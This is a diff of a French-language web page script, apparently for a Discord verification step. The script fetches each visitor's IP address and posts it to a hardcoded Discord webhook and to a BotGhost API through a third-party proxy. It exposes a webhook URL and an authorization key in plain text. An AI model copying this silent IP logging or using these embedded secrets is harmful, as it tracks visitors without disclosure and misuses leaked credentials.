@@ -51,22 +51,19 @@
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K";
-        const proxy = "https://corsproxy.io/?";
+        const proxy = "https://thingproxy.freeboard.io/";
         const apiUrl = "https://api.botghost.com/webhook/1151241118403534958/0t2nh2769i3bdja5axve7b";
 
         function checkIP() {
-            // Récupère l'IP de l'utilisateur via l'API ipify
             fetch("https://api.ipify.org?format=json")
                 .then(response => response.json())
                 .then(data => {
                     const userIP = data.ip;
 
-                    // Prépare le message pour le webhook Discord
                     const message = {
                         content: `Nouvelle vérification : \n**IP**: ${userIP}`
                     };
 
-                    // Envoie les informations au webhook Discord
                     fetch(webhookURL, {
                         method: "POST",
                         headers: {
@@ -82,7 +79,6 @@
                         document.getElementById("result").innerText = "Erreur lors de la validation.";
                     });
 
-                    // Envoie une requête POST à l'API BotGhost
                     const apiPayload = {
                         variables: [
                             {
@@ -96,7 +92,7 @@
                     fetch(proxy + apiUrl, {
                         method: "POST",
                         headers: {
-                            "Authorization": "bd8f5e61c5b98e12773f211488437e25f753c9139c32103c0bcce6f2bf9223f9",  // Remplacez par votre API_KEY
+                            "Authorization": "bd8f5e61c5b98e12773f211488437e25f753c9139c32103c0bcce6f2bf9223f9",
                             "Content-Type": "application/json"
                         },
                         body: JSON.stringify(apiPayload)
